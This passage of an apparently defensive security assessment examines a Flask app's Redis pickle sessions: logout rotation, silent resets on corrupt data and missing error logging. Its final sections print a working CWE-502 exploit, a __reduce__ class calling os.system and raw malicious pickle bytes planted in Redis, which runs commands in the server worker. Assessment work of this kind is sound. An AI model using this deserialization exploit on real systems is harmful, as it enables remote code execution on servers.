$ redis EXISTS session:551174df-7aa7-418f-9cb6-a9e97d6fa5cc  -> 1
$ redis TTL    session:551174df-7aa7-418f-9cb6-a9e97d6fa5cc  -> 604800
raw pickled bytes (300 bytes): b'\x80\x04\x95!\x01\x00\x00\x00\x00\x00\x00}\x94(\x8c\n_permanent\x94\x88\x8c\x06_fresh\x94\x88\x8c\ncsrf_token\x94\x8c(9d7db750f4835b53ee1ff0a9ddf2df0fe66b037f\x94\x8c\x08_user_id\x94\x8c$e76413ad-9d99-42ae-991a-199a64e10e7a\x94\x8c\x03_id\x94\x8c\x80f4a4143536f3e6712e19e6ce901a12f1ff7e8c98d04dd3e41c746e85093b48a1bfaa93650d1759a0cb7f13cba57b7f96e40ed981f0c49af1cb94f9905ee1dd03\x94\x8c\tsudo_time\x94J\xb1\xf1Mju.'
decoded keys = ['_fresh', '_id', '_permanent', '_user_id', 'csrf_token', 'sudo_time']
    _fresh = True
    _id = 'f4a4143536f3e6712e19e6ce901a12f1ff7e8c98d04dd3e41c746e85093b48a1bfaa93650d1759a0cb7f13cba57b7f96e40ed981f0c49af1cb94f9905ee1dd03'
    _permanent = True
    _user_id = 'e76413ad-9d99-42ae-991a-199a64e10e7a'
    csrf_token = '9d7db750f4835b53ee1ff0a9ddf2df0fe66b037f'
    sudo_time = 1783493041
$ GET /dashboard -> 200  (Location: None)
```

**Key-origin cross-reference:**

| Key | Value observed | Set by | `file:line` |
|-----|----------------|--------|-------------|
| `_user_id` | `e76413ad-…-199a64e10e7a` | Flask-Login `login_user()` | `app/auth/views/login_utils.py:36` |
| `_fresh` | `True` | Flask-Login `login_user()` | (flask-login 0.5.0 internals) |
| `_id` | 128-hex identity hash | Flask-Login `login_user()` (tied to `session_protection = "strong"`) | `app/extensions.py:8` |
| `sudo_time` | `1783493041` | app view | `app/auth/views/login_utils.py:37` |
| `csrf_token` | `9d7db750…e66b037f` | Flask-WTF | (extension) |
| `_permanent` | `True` | `session.permanent = True` | `server.py:206` |

- **`before`** (pre-login): `['_fresh', '_permanent', 'csrf_token']`, TTL 300. **`after`** (post-login): six keys above, TTL 604800.
- Observed nuance: **the session ID is NOT rotated on login** — the same UUID `551174df-…` carries through (`session_id changed on login? False`); only the *contents* and TTL change. (Rotation happens on logout — see R2(d).)

### R2(c) — `save_session` write path (grounding)

Every response writes the session back (`app/session.py:82-114`):

```python
val = pickle.dumps(dict(session))                          # L91
ttl = int(app.permanent_session_lifetime.total_seconds())  # L92 -> 604800 (7 days)
if "_user_id" not in session:
    ttl = 300                                              # L95-96  (CSRF-only)
self._redis_w.setex(name=self._get_key(session.session_id),
                    value=val, time=ttl)                   # L97-101
signed_session_id = self._get_signer(app).sign(
    itsdangerous.want_bytes(session.session_id))           # L102-104  (signs only the id)
response.set_cookie(app.session_cookie_name, signed_session_id, ...)  # L105-114
```

### R2(d) — Logout (condition 2)

Complete driver output for `GET /auth/logout`:

```console
----- CONDITION 2: GET /auth/logout -----
BEFORE: authenticated sid=551174df-7aa7-418f-9cb6-a9e97d6fa5cc EXISTS=1
$ GET /auth/logout -> 302
Location: http://127.0.0.1:7788/auth/login
ALL Set-Cookie headers on logout response (4):
Set-Cookie: slapp=; Expires=Thu, 01-Jan-1970 00:00:00 GMT; Max-Age=0; Path=/
Set-Cookie: mfa=; Expires=Thu, 01-Jan-1970 00:00:00 GMT; Max-Age=0; Path=/
Set-Cookie: dark-mode=; Expires=Thu, 01-Jan-1970 00:00:00 GMT; Max-Age=0; Path=/
Set-Cookie: slapp=19a1e7c1-4296-4c68-8dce-0cc93593a3b9.r6gPDxIgYCTirt2TqlV8nPEh2Fk; Expires=Wed, 15-Jul-2026 06:44:01 GMT; HttpOnly; Path=/; SameSite=Lax
AFTER: old key session:551174df-7aa7-418f-9cb6-a9e97d6fa5cc EXISTS=0  (deleted by purge_session)
AFTER: session_id rotated? True  (new id = 19a1e7c1-4296-4c68-8dce-0cc93593a3b9)
$ redis EXISTS session:19a1e7c1-4296-4c68-8dce-0cc93593a3b9  -> 1
$ redis TTL    session:19a1e7c1-4296-4c68-8dce-0cc93593a3b9  -> 300
raw pickled bytes (150 bytes): b'\x80\x04\x95\x8b\x00\x00\x00\x00\x00\x00\x00}\x94(\x8c\n_permanent\x94\x88\x8c\ncsrf_token\x94\x8c(9d7db750f4835b53ee1ff0a9ddf2df0fe66b037f\x94\x8c\tsudo_time\x94J\xb1\xf1Mj\x8c\x08_flashes\x94]\x94\x8c\x07success\x94\x8c\x12You are logged out\x94\x86\x94au.'
decoded keys = ['_flashes', '_permanent', 'csrf_token', 'sudo_time']
    _flashes = [('success', 'You are logged out')]
    _permanent = True
    csrf_token = '9d7db750f4835b53ee1ff0a9ddf2df0fe66b037f'
    sudo_time = 1783493041
```

**Grounding & reasoning.**

- `logout_session()` (`app/auth/views/logout.py:10`) calls Flask-Login `logout_user()` and then `purge_session(session)` (`app/session.py:117-121`).
- `purge_session` (`app/session.py:61-66`) does two things: **`self._redis_w.delete(...)`** (`app/session.py:63`) removes the old `session:<uuid>` key &rarr; observed `EXISTS=0`; and **`session.session_id = str(uuid.uuid4())`** (`app/session.py:64`) rotates the ID &rarr; observed new UUID `19a1e7c1-…`.
- The **first** `slapp` header (empty, `Max-Age=0`) is `response.delete_cookie(SESSION_COOKIE_NAME)` at `app/auth/views/logout.py:13`; the view also deletes `mfa` (`:14`) and `dark-mode` (`:15`). The **fourth** `slapp` header (new rotated UUID) is emitted by `save_session` running *after* the view returns — hence **two `slapp` `Set-Cookie` headers** on one response. The new key's TTL is 300 because `logout_user()` removed `_user_id`, so the CSRF-only branch (`app/session.py:95-96`) applies again; the decoded new session holds `_flashes = [('success', 'You are logged out')]` and no `_user_id`/`_fresh`/`_id`.
- The **API logout sibling** `app/api/views/user_info.py:140,142` (`logout_session()` then `response.delete_cookie(SESSION_COOKIE_NAME)`) is the **inferred**-equivalent path; it was not exercised at runtime but calls the identical `logout_session()`/`delete_cookie` pair.

---

## R3 — Malformed-data behavior

**Direct answer: silent reset.** When the Redis session value is corrupt or malformed, the next request does **not** fail and does **not** surface an error — it **silently resets** the session. `open_session` wraps the `pickle.loads` call in a bare `try / except Exception: pass` (`app/session.py:78-79`) and, on any exception, falls through to `return ServerSession(session_id=str(uuid.uuid4()))` (`app/session.py:80`) — a brand-new empty session with a fresh UUID. Proven below for **both** random garbage bytes and a truncated valid pickle.

**Grounding (`file:line`).** `app/session.py:74-80`:

```python
if val is not None:
    try:
        data = pickle.loads(val)                 # L76  <-- deserialization
        return ServerSession(data, session_id=session_id)  # L77
    except Exception:                            # L78  <-- catches EVERYTHING
        pass                                     # L79  <-- no logging, no re-raise
return ServerSession(session_id=str(uuid.uuid4()))  # L80  <-- silent reset
```

### R3 Case 1 — Random / garbage bytes (condition 5)

Complete driver output (the `python -c` line reproduces `pickle.loads` on the exact poisoned bytes in a standalone canonical 3.10 process):

```console
========== R3 CONDITION 5: random/garbage bytes ==========
BEFORE: authenticated login sid=83c7ce09-bb39-4c5f-a174-5b265092586a
cookie = 83c7ce09-bb39-4c5f-a174-5b265092586a.BSFlDpnHJeGErAJOEBkWtF8kNeU
$ redis EXISTS session:83c7ce09-bb39-4c5f-a174-5b265092586a  -> 1
$ redis TTL    session:83c7ce09-bb39-4c5f-a174-5b265092586a  -> 604800
raw pickled bytes (300 bytes): b'\x80\x04\x95!\x01\x00\x00\x00\x00\x00\x00}\x94(\x8c\n_permanent\x94\x88\x8c\x06_fresh\x94\x88\x8c\ncsrf_token\x94\x8c(21abe034d27d76ceefb865d6d0166d3cf641d545\x94\x8c\x08_user_id\x94\x8c$e76413ad-9d99-42ae-991a-199a64e10e7a\x94\x8c\x03_id\x94\x8c\x80f4a4143536f3e6712e19e6ce901a12f1ff7e8c98d04dd3e41c746e85093b48a1bfaa93650d1759a0cb7f13cba57b7f96e40ed981f0c49af1cb94f9905ee1dd03\x94\x8c\tsudo_time\x94J\xb2\xf1Mju.'
decoded keys = ['_fresh', '_id', '_permanent', '_user_id', 'csrf_token', 'sudo_time']
    _fresh = True
    _id = 'f4a4143536f3e6712e19e6ce901a12f1ff7e8c98d04dd3e41c746e85093b48a1bfaa93650d1759a0cb7f13cba57b7f96e40ed981f0c49af1cb94f9905ee1dd03'
    _permanent = True
    _user_id = 'e76413ad-9d99-42ae-991a-199a64e10e7a'
    csrf_token = '21abe034d27d76ceefb865d6d0166d3cf641d545'
    sudo_time = 1783493042
$ GET /dashboard -> 200  (authenticated)

POISON: overwrite ONLY the Redis payload (valid signed cookie retained)
>>> r.set('session:83c7ce09-bb39-4c5f-a174-5b265092586a', b'\x00\x01\x02not-a-pickle\xff\xfe')   # 17 bytes

DURING: reproduce pickle.loads against the EXACT poisoned bytes (canonical 3.10)
$ python -c "import pickle; pickle.loads(b'\x00\x01\x02not-a-pickle\xff\xfe')"
Traceback (most recent call last):
  File "<string>", line 1, in <module>
_pickle.UnpicklingError: invalid load key, '\x00'.
(exit code: 1)

AFTER: next request with the SAME valid cookie
$ GET /dashboard -> 302
Location: http://127.0.0.1:7788/auth/login?next=%2Fdashboard%3F
$ GET /auth/login -> 200
session_id reset to NEW uuid = ab61ebcc-4641-4a91-8d4c-0c424970d3fa   (rotated? True)
$ redis EXISTS session:83c7ce09-bb39-4c5f-a174-5b265092586a  -> 1   (garbage still present)
$ redis EXISTS session:ab61ebcc-4641-4a91-8d4c-0c424970d3fa  -> 1   (new session)
```

- **`before`**: populated authenticated session, `/dashboard` = 200.
- **`during`**: `pickle.loads` on the exact poisoned bytes raises **`_pickle.UnpicklingError: invalid load key, '\x00'.`**
- **`after`**: the request is redirected to login (Flask-Login sees no `_user_id` in the fresh session) with a **302**, not a 500; the session ID is reset to a new UUID.
- Observed nuance: `open_session` **does not delete** the corrupt key — it just returns a fresh session (`app/session.py:80`), so the garbage key persists in Redis until its TTL expires (`garbage still present`).

### R3 Case 2 — Truncated valid pickle (condition 6)

Complete driver output (a valid 131-byte pickle truncated to its first 65 bytes):

```console
========== R3 CONDITION 6: truncated valid pickle ==========
FULL valid pickle (131 bytes): b'\x80\x04\x95x\x00\x00\x00\x00\x00\x00\x00}\x94(\x8c\n_permanent\x94\x88\x8c\x06_fresh\x94\x88\x8c\ncsrf_token\x94\x8c\x08deadbeef\x94\x8c\x08_user_id\x94\x8c$e76413ad-9d99-42ae-991a-199a64e10e7a\x94\x8c\tsudo_time\x94J\xd6\xe1Mju.'
TRUNCATED first half (65 bytes): b'\x80\x04\x95x\x00\x00\x00\x00\x00\x00\x00}\x94(\x8c\n_permanent\x94\x88\x8c\x06_fresh\x94\x88\x8c\ncsrf_token\x94\x8c\x08deadbeef\x94\x8c\x08_'

BEFORE: authenticated login sid=a72d7b71-e228-4475-827f-5695fb855a96
$ redis EXISTS session:a72d7b71-e228-4475-827f-5695fb855a96  -> 1
$ redis TTL    session:a72d7b71-e228-4475-827f-5695fb855a96  -> 604800
raw pickled bytes (300 bytes): b'\x80\x04\x95!\x01\x00\x00\x00\x00\x00\x00}\x94(\x8c\n_permanent\x94\x88\x8c\x06_fresh\x94\x88\x8c\ncsrf_token\x94\x8c(59b7c0951a1a9d89124d640805102012a36629d2\x94\x8c\x08_user_id\x94\x8c$e76413ad-9d99-42ae-991a-199a64e10e7a\x94\x8c\x03_id\x94\x8c\x80f4a4143536f3e6712e19e6ce901a12f1ff7e8c98d04dd3e41c746e85093b48a1bfaa93650d1759a0cb7f13cba57b7f96e40ed981f0c49af1cb94f9905ee1dd03\x94\x8c\tsudo_time\x94J\xb2\xf1Mju.'
decoded keys = ['_fresh', '_id', '_permanent', '_user_id', 'csrf_token', 'sudo_time']
    _fresh = True
    _id = 'f4a4143536f3e6712e19e6ce901a12f1ff7e8c98d04dd3e41c746e85093b48a1bfaa93650d1759a0cb7f13cba57b7f96e40ed981f0c49af1cb94f9905ee1dd03'
    _permanent = True
    _user_id = 'e76413ad-9d99-42ae-991a-199a64e10e7a'
    csrf_token = '59b7c0951a1a9d89124d640805102012a36629d2'
    sudo_time = 1783493042

POISON:
>>> r.set('session:a72d7b71-e228-4475-827f-5695fb855a96', b'\x80\x04\x95x\x00\x00\x00\x00\x00\x00\x00}\x94(\x8c\n_permanent\x94\x88\x8c\x06_fresh\x94\x88\x8c\ncsrf_token\x94\x8c\x08deadbeef\x94\x8c\x08_')   # 65 bytes

DURING: reproduce against the exact truncated bytes (canonical 3.10)
$ python -c "import pickle; pickle.loads(b'\x80\x04\x95x\x00\x00\x00\x00\x00\x00\x00}\x94(\x8c\n_permanent\x94\x88\x8c\x06_fresh\x94\x88\x8c\ncsrf_token\x94\x8c\x08deadbeef\x94\x8c\x08_')"
Traceback (most recent call last):
  File "<string>", line 1, in <module>
_pickle.UnpicklingError: pickle data was truncated
(exit code: 1)

AFTER: next request with the SAME valid cookie
$ GET /dashboard -> 302  (Location: http://127.0.0.1:7788/auth/login?next=%2Fdashboard%3F)
$ GET /auth/login -> 200
session_id reset to NEW uuid = ef4ce277-6047-4d5b-b87c-b26e9a329390   (rotated? True)
old key EXISTS=1 (truncated ignored); new key EXISTS=1
```

- **`during`**: `pickle.loads` on the truncated bytes raises **`_pickle.UnpicklingError: pickle data was truncated`**.
- Same **`before` &rarr; `during` &rarr; `after`** shape as Case 1: populated &rarr; raises &rarr; silent reset to a new UUID; **302, never 500**.

**Causal reasoning (R3).** `UnpicklingError` is a subclass of `Exception`, so the bare `except Exception` at `app/session.py:78` catches it; `pass` (`:79`) discards it; control falls to `app/session.py:80`, returning an empty `ServerSession`. Flask-Login then finds no `_user_id`, so the `login_required` view redirects to `/auth/login` — a normal 302, indistinguishable from an ordinary "not logged in" response.

---
## R4 — Response/log surface

**Direct answer.** When malformed data is encountered: the **HTTP response is a normal (non-error) response** (a `302` redirect to login, followed by `200` on the login page) — **never a 500**; the **application log shows no deserialization error line** (only ordinary request-completion `DEBUG` lines); and **no Sentry event** is produced. This follows directly from the bare `except Exception: pass` (`app/session.py:78-79`) containing **no logging call**, and from Sentry capturing only *uncaught* exceptions.

### R4(a) — HTTP responses

Both malformed cases in R3 returned a **302** to `/auth/login?next=…` and a subsequent **200** on the login page (see the `snip`-free complete output in R3 Case 1 and Case 2). No `500`, no traceback page, no stack trace in the body. The client sees exactly what a logged-out visitor sees.

### R4(b) — Application logs (the "SL" logger → stdout)

The complete stdout window captured from the gunicorn server (`/tmp/sl_server.log`) across the entire driver run — every login, logout, and poisoned request — contains **only** the benign request-completion `DEBUG` lines emitted by `after_request()` at `server.py:284` (plus the `after_login()` `DEBUG` lines at `login_utils.py:35,44`). There is **no** deserialization error line anywhere:

```console
$ docker exec sl_app bash -lc 'sed -n "10,$p" /tmp/sl_server.log'

2026-07-08 06:43:47,327 - SL - DEBUG - 17155 - "/app/server.py:284" - after_request() -  - 127.0.0.1 GET / ImmutableMultiDict([]) 302, takes 0.0003006458282470703
2026-07-08 06:43:47,355 - SL - DEBUG - 17155 - "/app/server.py:284" - after_request() -  - 127.0.0.1 GET /auth/login ImmutableMultiDict([]) 200, takes 0.01956939697265625
2026-07-08 06:44:01,472 - SL - DEBUG - 17155 - "/app/server.py:284" - after_request() -  - 127.0.0.1 GET /auth/login ImmutableMultiDict([]) 200, takes 0.0014286041259765625
2026-07-08 06:44:01,719 - SL - DEBUG - 17155 - "/app/app/auth/views/login_utils.py:35" - after_login() -  - log user <User 395 John Wick john@wick.com> in
2026-07-08 06:44:01,729 - SL - DEBUG - 17155 - "/app/app/auth/views/login_utils.py:44" - after_login() -  - redirect user to dashboard
2026-07-08 06:44:01,729 - SL - DEBUG - 17155 - "/app/server.py:284" - after_request() -  - 127.0.0.1 POST /auth/login ImmutableMultiDict([]) 302, takes 0.25342369079589844
2026-07-08 06:44:01,851 - SL - DEBUG - 17155 - "/app/server.py:284" - after_request() -  - 127.0.0.1 GET /dashboard ImmutableMultiDict([]) 200, takes 0.11619019508361816
2026-07-08 06:44:01,857 - SL - DEBUG - 17155 - "/app/server.py:284" - after_request() -  - 127.0.0.1 GET /auth/logout ImmutableMultiDict([]) 302, takes 0.0024690628051757812
2026-07-08 06:44:01,878 - SL - DEBUG - 17155 - "/app/server.py:284" - after_request() -  - 127.0.0.1 GET /auth/login ImmutableMultiDict([]) 200, takes 0.0012633800506591797
2026-07-08 06:44:02,120 - SL - DEBUG - 17155 - "/app/app/auth/views/login_utils.py:35" - after_login() -  - log user <User 395 John Wick john@wick.com> in
2026-07-08 06:44:02,120 - SL - DEBUG - 17155 - "/app/app/auth/views/login_utils.py:44" - after_login() -  - redirect user to dashboard
2026-07-08 06:44:02,120 - SL - DEBUG - 17155 - "/app/server.py:284" - after_request() -  - 127.0.0.1 POST /auth/login ImmutableMultiDict([]) 302, takes 0.2392423152923584
2026-07-08 06:44:02,174 - SL - DEBUG - 17155 - "/app/server.py:284" - after_request() -  - 127.0.0.1 GET /dashboard ImmutableMultiDict([]) 200, takes 0.049361467361450195
2026-07-08 06:44:02,228 - SL - DEBUG - 17155 - "/app/server.py:284" - after_request() -  - 127.0.0.1 GET /dashboard ImmutableMultiDict([]) 302, takes 0.00044274330139160156
2026-07-08 06:44:02,233 - SL - DEBUG - 17155 - "/app/server.py:284" - after_request() -  - 127.0.0.1 GET /auth/login ImmutableMultiDict([]) 200, takes 0.0013303756713867188
2026-07-08 06:44:02,236 - SL - DEBUG - 17155 - "/app/server.py:284" - after_request() -  - 127.0.0.1 GET /auth/login ImmutableMultiDict([]) 200, takes 0.0010876655578613281
2026-07-08 06:44:02,478 - SL - DEBUG - 17155 - "/app/app/auth/views/login_utils.py:35" - after_login() -  - log user <User 395 John Wick john@wick.com> in
2026-07-08 06:44:02,479 - SL - DEBUG - 17155 - "/app/app/auth/views/login_utils.py:44" - after_login() -  - redirect user to dashboard
2026-07-08 06:44:02,479 - SL - DEBUG - 17155 - "/app/server.py:284" - after_request() -  - 127.0.0.1 POST /auth/login ImmutableMultiDict([]) 302, takes 0.24040889739990234
2026-07-08 06:44:02,513 - SL - DEBUG - 17155 - "/app/server.py:284" - after_request() -  - 127.0.0.1 GET /dashboard ImmutableMultiDict([]) 302, takes 0.00040078163146972656
2026-07-08 06:44:02,517 - SL - DEBUG - 17155 - "/app/server.py:284" - after_request() -  - 127.0.0.1 GET /auth/login ImmutableMultiDict([]) 200, takes 0.0012106895446777344
2026-07-08 06:44:02,558 - SL - DEBUG - 17155 - "/app/server.py:284" - after_request() -  - 127.0.0.1 GET /auth/login ImmutableMultiDict([]) 200, takes 0.001177072525024414
2026-07-08 06:44:02,809 - SL - DEBUG - 17155 - "/app/app/auth/views/login_utils.py:35" - after_login() -  - log user <User 395 John Wick john@wick.com> in
2026-07-08 06:44:02,809 - SL - DEBUG - 17155 - "/app/app/auth/views/login_utils.py:44" - after_login() -  - redirect user to dashboard
2026-07-08 06:44:02,809 - SL - DEBUG - 17155 - "/app/server.py:284" - after_request() -  - 127.0.0.1 POST /auth/login ImmutableMultiDict([]) 302, takes 0.2389218807220459
2026-07-08 06:44:02,886 - SL - DEBUG - 17155 - "/app/server.py:284" - after_request() -  - 127.0.0.1 GET /dashboard ImmutableMultiDict([]) 200, takes 0.05294680595397949
2026-07-08 06:44:02,892 - SL - DEBUG - 17155 - "/app/server.py:284" - after_request() -  - 127.0.0.1 GET /dashboard ImmutableMultiDict([]) 302, takes 0.00032067298889160156
2026-07-08 06:44:03,201 - SL - DEBUG - 17155 - "/app/server.py:284" - after_request() -  - 127.0.0.1 GET /auth/login ImmutableMultiDict([]) 200, takes 0.0014951229095458984
2026-07-08 06:44:03,446 - SL - DEBUG - 17155 - "/app/app/auth/views/login_utils.py:35" - after_login() -  - log user <User 395 John Wick john@wick.com> in
2026-07-08 06:44:03,447 - SL - DEBUG - 17155 - "/app/app/auth/views/login_utils.py:44" - after_login() -  - redirect user to dashboard
2026-07-08 06:44:03,447 - SL - DEBUG - 17155 - "/app/server.py:284" - after_request() -  - 127.0.0.1 POST /auth/login ImmutableMultiDict([]) 302, takes 0.24264788627624512
2026-07-08 06:44:03,456 - SL - DEBUG - 17155 - "/app/server.py:284" - after_request() -  - 127.0.0.1 GET /dashboard ImmutableMultiDict([]) 302, takes 0.0004096031188964844
2026-07-08 06:44:03,764 - SL - DEBUG - 17155 - "/app/server.py:284" - after_request() -  - 127.0.0.1 GET /auth/login ImmutableMultiDict([]) 200, takes 0.0014071464538574219
2026-07-08 06:44:04,011 - SL - DEBUG - 17155 - "/app/app/auth/views/login_utils.py:35" - after_login() -  - log user <User 395 John Wick john@wick.com> in
2026-07-08 06:44:04,012 - SL - DEBUG - 17155 - "/app/app/auth/views/login_utils.py:44" - after_login() -  - redirect user to dashboard
2026-07-08 06:44:04,012 - SL - DEBUG - 17155 - "/app/server.py:284" - after_request() -  - 127.0.0.1 POST /auth/login ImmutableMultiDict([]) 302, takes 0.2449331283569336
2026-07-08 06:44:04,062 - SL - DEBUG - 17155 - "/app/server.py:284" - after_request() -  - 127.0.0.1 GET /dashboard ImmutableMultiDict([]) 302, takes 0.00038313865661621094
```

Automated content scan of the **entire** server log for error markers (`grep -c`):

```console
$ for p in UnpicklingError Traceback pickle " ERROR "; do echo "log contains '$p' ? $(docker exec sl_app grep -c \"$p\" /tmp/sl_server.log)"; done

log contains 'UnpicklingError' ? 0
log contains 'Traceback'      ? 0
log contains 'pickle'         ? 0
log contains ' ERROR '        ? 0
```

- The request itself **is** logged (the normal `302`/`200` completion line), but the **swallowed pickle error is not** — because there is **no logging call inside the `except` block** (`app/session.py:78-79`).
- Grounding for the log configuration: the "SL" logger writes to `sys.stdout` (`app/log.py:41`) at level `DEBUG` (`app/log.py:51`); `LOG = _get_logger("SL")` (`app/log.py:79`); werkzeug's default request logging is disabled (`app/log.py:70-71`), which is why there is no separate werkzeug access line.

### R4(c) — Sentry

```console
$ docker exec sl_app bash -lc 'source /app/venv/bin/activate && cd /app && CONFIG=tests/test.env python -c "import app.config as c; print(\"SENTRY_DSN =\", repr(getattr(c, \"SENTRY_DSN\", None)))"'

>>> URL: http://localhost
WARNING: Use a temp directory for GNUPGHOME /tmp/nkfipfppdjkikpcevzfq
Upload files to local dir
SENTRY_DSN = None
```

- **Observed:** `SENTRY_DSN` is `None` in the canonical local build, so the `if SENTRY_DSN:` guard at `server.py:111` is false and `sentry_sdk.init(...)` never runs &rarr; **no Sentry event is possible**.
- **Inferred:** even if Sentry *were* initialized, its Flask integration captures **uncaught** exceptions; a `pickle.loads` failure here is *caught* by `app/session.py:78-79`, so it would not be reported. (The "not initialized" fact is observed; the "would not report even if initialized" clause is labeled **inferred**.)

**Causal reasoning (R4).** The silent-reset design means the failure never propagates: no exception escapes `open_session`, so Flask's error handling (and any 500 page) is never triggered; no logging statement exists on the failure path, so nothing is written to the "SL" stream beyond the normal request line; and Sentry — unset here and dependent on *uncaught* exceptions — has nothing to capture.

---

## R5 — Risk boundary (observed, not theory)

**Direct answer.** The boundary is **"reset vs. code execution," not "reset vs. error."** Random / truncated / corrupt bytes raise inside `pickle.loads`, get caught at `app/session.py:78-79`, and reset the session (R3). But a **well-formed malicious pickle does not raise** — its `__reduce__` callable **executes *during* `pickle.loads` at `app/session.py:76`, *before* the `except` can act** — so the exact same code path that harmlessly resets on garbage will *run attacker-chosen code* on a valid-but-malicious payload. Proven by a marker file written by the gunicorn worker process itself.

### R5 — CWE-502 proof-of-construct (labeled: standard PoC, NOT user-supplied)

The payload is a standard CWE-502 construct — a class whose `__reduce__` returns `(os.system, (cmd,))` where `cmd` writes an unmistakable marker stamped with the running process's PID. The construction, the exact malicious bytes, and a standalone local reproduction (which shows `pickle.loads` returns the `os.system` exit code and raises **no** exception) are below:

```console
########## R5/R6 MALICIOUS PICKLE PROOF-OF-CONSTRUCT ##########
PoC class: Exploit.__reduce__ returns (os.system, (cmd,))
cmd = 'echo "code-exec-during-pickle.loads marker=local ppid=$PPID epoch=$(date +%s)" > /tmp/pwned_local'
malicious pickle (135 bytes): b'\x80\x04\x95|\x00\x00\x00\x00\x00\x00\x00\x8c\x05posix\x94\x8c\x06system\x94\x93\x94\x8caecho "code-exec-during-pickle.loads marker=local ppid=$PPID epoch=$(date +%s)" > /tmp/pwned_local\x94\x85\x94R\x94.'

Local reproduction in a standalone canonical 3.10 process:
$ python - << 'PY'   # exact code executed via python -c
import pickle, os
cmd = 'echo "code-exec-during-pickle.loads marker=local ppid=$PPID epoch=$(date +%s)" > /tmp/pwned_localrepro'
class Exploit:
    def __reduce__(self):
        return (os.system, (cmd,))
malicious = pickle.dumps(Exploit())
rv = pickle.loads(malicious)
print('pickle.loads return value:', repr(rv))
print('exception raised? no')
PY
pickle.loads return value: 0
exception raised? no
marker written by local repro: code-exec-during-pickle.loads marker=local ppid=17207 epoch=1783493042
```

The opcodes tell the story: `\x8c\x05posix` (push module `posix`), `\x8c\x06system` (attribute `system`), `\x93` (`STACK_GLOBAL` &rarr; `posix.system`), the command string, `\x85` (`TUPLE1`), then `R` (the `REDUCE` opcode) — i.e. on load, pickle calls `posix.system(cmd)`. The local reproduction returned `0` (the `os.system` exit code) and **raised no exception**, confirming the callable ran *inside* `loads`. (The local reproduction's marker shows `ppid=17207`, the pid of that standalone `python -c` process — contrast with the server worker pid `17155` below.)

### R5 — Server-side code execution (condition 7)

Complete driver output. A fresh authenticated login is poisoned by planting the malicious pickle at its Redis key; the next request reuses the **same valid signed cookie**:

```console
========== R5 CONDITION 7: well-formed malicious pickle ==========
BEFORE: authenticated login sid=f035a177-6ec8-4064-af3b-3dd797d2d3c0
cookie = f035a177-6ec8-4064-af3b-3dd797d2d3c0.Crq6109y8jzEJ_adR9mnBRA8hu8
$ test -f /tmp/pwned_c7 && echo EXISTS || echo ABSENT -> ABSENT
$ GET /dashboard -> 200  (authenticated)

malicious pickle (132 bytes): b'\x80\x04\x95y\x00\x00\x00\x00\x00\x00\x00\x8c\x05posix\x94\x8c\x06system\x94\x93\x94\x8c^echo "code-exec-during-pickle.loads marker=cond7 ppid=$PPID epoch=$(date +%s)" > /tmp/pwned_c7\x94\x85\x94R\x94.'

PLANT the malicious pickle at the session key (valid signed cookie retained):
>>> r.set('session:f035a177-6ec8-4064-af3b-3dd797d2d3c0', mal7)   # mal7 = the 132-byte pickle shown immediately above

DURING/AFTER: next request with the SAME valid cookie
$ GET /dashboard -> 302
Location: http://127.0.0.1:7788/auth/login?next=%2Fdashboard%3F
$ cat /tmp/pwned_c7
code-exec-during-pickle.loads marker=cond7 ppid=17155 epoch=1783493042
```

**The `ppid=17155` is the gunicorn worker pid** (from the boot log in the Methodology section). The marker was written by the **server process itself** while handling the request — proving `posix.system(...)` executed inside `RedisSessionStore.open_session`'s `pickle.loads` at `app/session.py:76`.

**R5 conclusion (from observed behavior).** A well-formed malicious pickle **does not raise**, so the `except` at `app/session.py:78` is *never reached* for it — the damage (`posix.system`) is already done by the time `pickle.loads` returns. The **critical, observed** point: on both the **HTTP surface (302)** and the **log surface (no error line)**, the malicious code-execution request is **indistinguishable from a harmless reset**. That is precisely why the real boundary is **reset vs. code execution**, not reset vs. error. `before`: marker absent, authenticated. `during`: `pickle.loads` invokes `posix.system`. `after`: marker present (`ppid=17155`), request 302'd like any logged-out visitor. (`posix.system` returns `0`; `pickle.loads` returns `0`; `ServerSession(0, …)` does **not** raise, because werkzeug's `CallbackDict.__init__` does `dict.__init__(self, initial or ())` and `0 or ()` is an empty dict — so `open_session` returns an **empty** session carrying the **same** id, the `except` at `app/session.py:78` is *never reached*, and the `app/session.py:80` new-UUID reset does **not** occur; the user is simply anonymous on the next request — but the code has already run.)

---

## R6 — Attacker tampering without forging the signed ID

**Direct answer: yes — it changes the risk materially, from a benign reset to potential code execution.** `itsdangerous.Signer` authenticates **only the session-ID pointer** (`_get_signer` at `app/session.py:37-41`; signing at `app/session.py:102-104`; validation via `unsign` at `app/session.py:54-59`) and applies **no MAC to the pickled payload**. So an attacker who can write to Redis but reuses a **legitimately-signed** cookie (no forgery at all) still reaches the vulnerable `pickle.loads` and achieves code execution. Contrast: an attacker who *forges/alters the cookie signature* trips `BadSignature`, `extract_and_validate_session_id` returns `None` (`app/session.py:58-59`), and the tampered Redis value is **never read**.

### R6 — Tamper-without-forgery (condition 8)

Complete driver output. A real login yields a legitimately-signed cookie; the Redis payload is overwritten with the malicious pickle while the cookie is left **byte-identical**:

```console
========== R6 CONDITION 8: tamper-without-forgery ==========
A real login yields a legitimately-signed cookie:
cookie = 0d50e571-7a20-41bc-bd72-05e0616f6360.OnTB-GTXC4lTOOgz9D55LZ5JCQQ

The signer authenticates ONLY the uuid pointer (canonical 3.10):
$ signer.unsign('0d50e571-7a20-41bc-bd72-05e0616f6360.OnTB-GTXC4lTOOgz9D55LZ5JCQQ').decode()
-> 0d50e571-7a20-41bc-bd72-05e0616f6360

Overwrite ONLY the Redis payload with the malicious pickle, keep the UNMODIFIED cookie:
malicious pickle (132 bytes): b'\x80\x04\x95y\x00\x00\x00\x00\x00\x00\x00\x8c\x05posix\x94\x8c\x06system\x94\x93\x94\x8c^echo "code-exec-during-pickle.loads marker=cond8 ppid=$PPID epoch=$(date +%s)" > /tmp/pwned_c8\x94\x85\x94R\x94.'
>>> r.set('session:0d50e571-7a20-41bc-bd72-05e0616f6360', mal8)
cookie BEFORE tamper == cookie AFTER tamper ? True
  (before: 0d50e571-7a20-41bc-bd72-05e0616f6360.OnTB-GTXC4lTOOgz9D55LZ5JCQQ)
  (after : 0d50e571-7a20-41bc-bd72-05e0616f6360.OnTB-GTXC4lTOOgz9D55LZ5JCQQ)
$ GET /dashboard  (unmodified legit cookie) -> 302
$ cat /tmp/pwned_c8
code-exec-during-pickle.loads marker=cond8 ppid=17155 epoch=1783493043
```

